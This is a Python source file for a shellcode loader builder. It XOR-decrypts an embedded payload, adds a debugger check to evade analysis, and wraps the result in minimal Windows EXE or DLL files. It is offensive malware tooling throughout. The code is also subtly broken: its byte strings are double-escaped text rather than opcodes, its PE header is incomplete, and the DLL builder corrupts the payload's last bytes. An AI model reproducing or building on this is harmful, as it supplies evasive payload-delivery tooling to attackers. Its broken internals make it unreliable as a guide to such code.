import struct
import random

class LoaderBuilder:
    def __init__(self):
        pass
    
    def build_loader(self, encrypted_sc, key, techniques=None):
        """Build loader for encrypted shellcode"""
        
        loader_template = self._select_loader_template(techniques)
        
        # Build loader based on template
        if loader_template == "basic":
            loader = self._build_basic_loader(encrypted_sc, key)
        elif loader_template == "advanced":
            loader = self._build_advanced_loader(encrypted_sc, key)
        else:
            loader = self._build_basic_loader(encrypted_sc, key)
        
        return loader
    
    def _select_loader_template(self, techniques):
        """Select loader template based on techniques"""
        if not techniques:
            return "basic"
        
        if "process_hollowing" in techniques:
            return "advanced"
        elif "reflective_dll" in techniques:
            return "advanced"
        else:
            return "basic"
    
    def _build_basic_loader(self, shellcode, key):
        """Build basic shellcode loader"""
        # Simple loader: decrypt and execute
        loader = bytearray()
        
        # XOR decryption stub
        loader.extend(b'\\x31\\xc9')           # xor ecx, ecx
        loader.extend(b'\\x8b\\x1c\\x0c')      # mov ebx, [esp+ecx]
        loader.extend(b'\\x80\\xf3')           # xor bl, key_byte
        loader.extend(struct.pack('B', key[0] if key else 0xAA))
        loader.extend(b'\\x88\\x1c\\x0c')      # mov [esp+ecx], bl
        loader.extend(b'\\x41')                # inc ecx
        loader.extend(b'\\x81\\xf9')           # cmp ecx, size
        loader.extend(struct.pack('<I', len(shellcode)))
        loader.extend(b'\\x75\\xef')           # jne -17
        
        # Add shellcode
        loader.extend(shellcode)
        
        return bytes(loader)
    
    def _build_advanced_loader(self, shellcode, key):
        """Build advanced loader with evasion"""
        # More sophisticated loader
        loader = bytearray()
        
        # Anti-debug check
        loader.extend(b'\\x64\\xa1\\x30\\x00\\x00\\x00')  # mov eax, fs:[0x30] (PEB)
        loader.extend(b'\\x0f\\xb6\\x40\\x02')           # movzx eax, byte ptr [eax+2] (BeingDebugged)
        loader.extend(b'\\x85\\xc0')                     # test eax, eax
        loader.extend(b'\\x75\\x03')                     # jne +3 (skip if debugger)
        loader.extend(b'\\xeb\\x01')                     # jmp +1 (continue)
        loader.extend(b'\\xc3')                         # ret (exit if debugger)
        
        # Add basic loader
        basic = self._build_basic_loader(shellcode, key)
        loader.extend(basic)
        
        return bytes(loader)
    
    def build_pe_loader(self, shellcode, output_format="exe"):
        """Build PE file with shellcode"""
        if output_format == "exe":
            return self._build_exe(shellcode)
        elif output_format == "dll":
            return self._build_dll(shellcode)
        else:
            return shellcode
    
    def _build_exe(self, shellcode):
        """Build minimal EXE file"""
        # Simple MZ/PE header with shellcode
        pe = bytearray()
        
        # DOS Header
        pe.extend(b'MZ')                    # Signature
        pe.extend(b'\\x90' * 58)           # DOS stub
        pe.extend(struct.pack('<I', 0x80)) # PE header offset
        
        # PE Header (simplified)
        pe.extend(b'PE\\x00\\x00')         # PE signature
        pe.extend(struct.pack('<H', 0x014C)) # Machine (x86)
        pe.extend(struct.pack('<H', 1))    # Number of sections
        pe.extend(struct.pack('<I', 0))    # Timestamp
        pe.extend(b'\\x00' * 12)           # Rest of header
        pe.extend(struct.pack('<H', 0x010F)) # Characteristics
        
        # Add shellcode
        pe.extend(shellcode)
        
        return bytes(pe)
    
    def _build_dll(self, shellcode):
        """Build minimal DLL file"""
        # Similar to EXE but with DLL characteristics
        dll = self._build_exe(shellcode)
        # Change last 2 bytes to indicate DLL
        return dll[:-2] + b'\\x20\\x02'
